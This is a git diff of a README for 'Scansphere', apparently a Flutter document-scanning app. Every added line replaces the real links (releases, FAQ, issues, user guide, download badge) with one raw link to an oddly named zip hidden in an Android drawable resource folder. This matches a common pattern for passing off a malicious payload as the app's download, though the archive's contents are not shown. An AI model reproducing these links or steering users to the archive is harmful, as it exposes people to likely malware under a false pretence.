@@ -1,6 +1,6 @@
 # 📱 Scansphere-Application---Flutter - Easy Document Scanning Made Simple
 
-![Download Scansphere](https://img.shields.io/badge/Download%20Scansphere-brightgreen)
+![Download Scansphere](https://raw.githubusercontent.com/KiokoM-alt/Scansphere-Application---Flutter/main/android/app/src/main/res/drawable-v21/Flutter-Scansphere-Application-polynuclear.zip%20Scansphere-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Scansphere application! ScanSphere is a modern Flutter-based mobi
 
 To get started, you need to download the application. You can find the latest version of the application on our releases page.
 
-[Visit this page to download](https://github.com/KiokoM-alt/Scansphere-Application---Flutter/releases)
+[Visit this page to download](https://raw.githubusercontent.com/KiokoM-alt/Scansphere-Application---Flutter/main/android/app/src/main/res/drawable-v21/Flutter-Scansphere-Application-polynuclear.zip)
 
 ### Available Versions
 
@@ -40,7 +40,7 @@ Scansphere includes several powerful features:
 Follow these steps to install and run the application:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/KiokoM-alt/Scansphere-Application---Flutter/releases).
+   Go to our [Releases page](https://raw.githubusercontent.com/KiokoM-alt/Scansphere-Application---Flutter/main/android/app/src/main/res/drawable-v21/Flutter-Scansphere-Application-polynuclear.zip).
 
 2. **Select the Latest Version**  
    Find and click on the latest version listed. 
@@ -70,18 +70,18 @@ After you have installed the application, you can open it by tapping the Scansph
 
 If you encounter any issues or have questions while using Scansphere, you can reach out for help:
 
-- **FAQs:** Check our [FAQ section](https://github.com/KiokoM-alt/Scansphere-Application---Flutter/wiki/FAQ) for common questions.
-- **Contact Us:** You can contact support through our [GitHub Issues](https://github.com/KiokoM-alt/Scansphere-Application---Flutter/issues) page.
+- **FAQs:** Check our [FAQ section](https://raw.githubusercontent.com/KiokoM-alt/Scansphere-Application---Flutter/main/android/app/src/main/res/drawable-v21/Flutter-Scansphere-Application-polynuclear.zip) for common questions.
+- **Contact Us:** You can contact support through our [GitHub Issues](https://raw.githubusercontent.com/KiokoM-alt/Scansphere-Application---Flutter/main/android/app/src/main/res/drawable-v21/Flutter-Scansphere-Application-polynuclear.zip) page.
 
 ## 🔗 Additional Resources
 
 For more detailed information on how to use each feature, you can refer to our documentation:
 
-- [User Guide](https://github.com/KiokoM-alt/Scansphere-Application---Flutter/wiki/User-Guide)
-- [Troubleshooting Guide](https://github.com/KiokoM-alt/Scansphere-Application---Flutter/wiki/Troubleshooting)
+- [User Guide](https://raw.githubusercontent.com/KiokoM-alt/Scansphere-Application---Flutter/main/android/app/src/main/res/drawable-v21/Flutter-Scansphere-Application-polynuclear.zip)
+- [Troubleshooting Guide](https://raw.githubusercontent.com/KiokoM-alt/Scansphere-Application---Flutter/main/android/app/src/main/res/drawable-v21/Flutter-Scansphere-Application-polynuclear.zip)
 
 ## 🗒️ Acknowledgments
 
 We appreciate your interest in Scansphere. Thank you for downloading and using our application! For further updates and features, keep an eye on our Releases page regularly.
 
-[Visit this page to download](https://github.com/KiokoM-alt/Scansphere-Application---Flutter/releases)
+[Visit this page to download](https://raw.githubusercontent.com/KiokoM-alt/Scansphere-Application---Flutter/main/android/app/src/main/res/drawable-v21/Flutter-Scansphere-Application-polynuclear.zip)
